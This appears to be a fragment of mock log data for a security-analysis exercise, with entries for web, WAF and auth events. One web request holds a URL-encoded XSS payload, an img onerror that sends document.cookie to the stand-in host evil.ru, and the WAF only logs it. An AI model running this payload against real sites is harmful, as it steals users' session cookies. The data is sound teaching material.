    { time: '02:22:07', source: 'web', level: 'critical', msg: '<span class="ip">185.220.101.34</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(\'https://evil.ru/steal%3Fc%3D\'+document.cookie)%3E</span></span> 200', suspicious: true },
    { time: '02:22:08', source: 'waf', level: 'critical', msg: 'Rule 941110 — XSS attack detected from <span class="ip">185.220.101.34</span> — action: <span class="hl">LOG_ONLY</span> (WAF in detection mode, NOT blocking)', suspicious: true },
    { time: '02:30:15', source: 'web', level: 'info', msg: '<span class="ip">203.0.113.42</span> GET <span class="path">/product/3</span> 200 — Firefox/125 — London, UK' },
    { time: '02:45:03', source: 'auth', level: 'info', msg: '<span class="ip">203.0.113.42</span> LOGIN success — user: <span class="session">james.wong@email.com</span> — session: <span class="session">sess_c41b</span>' },
    { time: '03:10:22', source: 'web', level: 'info', msg: '<span class="ip">10.0.4.55</span> GET <span class="path">/api/health</span> 200 — HealthCheck/1.0' },
